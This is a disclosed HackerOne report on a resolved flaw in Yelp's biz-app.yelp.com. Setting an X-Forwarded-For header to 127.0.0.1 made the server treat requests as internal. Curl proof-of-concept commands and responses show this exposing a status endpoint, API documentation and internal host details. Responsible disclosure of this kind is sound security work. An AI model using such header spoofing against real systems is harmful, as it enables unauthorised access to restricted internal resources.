---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1011767'
original_report_id: '1011767'
title: X-Forward-For Header allows to bypass access restrictions
weakness: Improper Access Control - Generic
team_handle: yelp
created_at: '2020-10-19T12:30:08.920Z'
disclosed_at: '2020-10-26T18:22:01.346Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 64
asset_identifier: biz-app.yelp.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- improper-access-control-generic
---

# X-Forward-For Header allows to bypass access restrictions

## Metadata

- HackerOne Report ID: 1011767
- Weakness: Improper Access Control - Generic
- Program: yelp
- Disclosed At: 2020-10-26T18:22:01.346Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
If the "X-Forward-For: 127.0.0.1" header is used, it allows to bypass restrictions of the web application and access endpoints that are restricted otherwise. This allows for example to access the "Business Owner App backend API". The responding server thinks, he is accessed by an internal IP.

## Platform(s) Affected:
Website: https://biz-app.yelp.com

## Steps To Reproduce:
POC1:
```
➜  /tmp curl -k https://biz-app.yelp.com/status                                

{"error": {"id": "PredicateMismatch"}}%                                                                                                                                   
➜  /tmp curl -k https://biz-app.yelp.com/status -H "X-Forwarded-For: 127.0.0.1"

{"host": "biz--app-main--useast1-74dd77b89b-fgtdk", "health": {}, "mem_vsz": 1111.61328125, "mem_rss": 410.0, "pid": 91941, "uptime": 178784.86051034927, "version": null}
```

POC2:
```
➜  /tmp curl -k https://biz-app.yelp.com/swagger.json                                                                                                                                                                
{"error": {"id": "HTTPNotFound"}}%                                                                                                                                                                                   
➜  /tmp curl -k https://biz-app.yelp.com/swagger.json -H "X-Forwarded-For: 127.0.0.1"                                                                                                                                                                                                                                                                                                                            
█████
█████
███████
█████████
████
███
████
██████
█████████ 
██████████ [...]
```

The responding server thinks, it is accessed by an internal IP as can be seen in the headers:
```
HTTP/1.1 200 OK
Connection: close
server: openresty/1.13.6.2
content-type: application/json
x-b3-sampled: 0
x-is-internal-ip-address: true
x-zipkin-id: 2fce61c10ade1e32
x-routing-service: routing-main--useast1-d84b86b87-cwstn; site=biz_app
x-mode: ro
x-proxied: 10-65-64-83-useast1aprod
x-extlb: 10-65-64-83-useast1aprod
Accept-Ranges: bytes
Date: Mon, 19 Oct 2020 12:21:19 GMT
Via: 1.1 varnish
X-Served-By: cache-hhn4033-HHN
X-Cache: MISS
X-Cache-Hits: 0
Content-Length: 573093
```

## Impact

As the attacker is seen as having an internal IP he is able to access resources which should otherwise be restricted for him.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
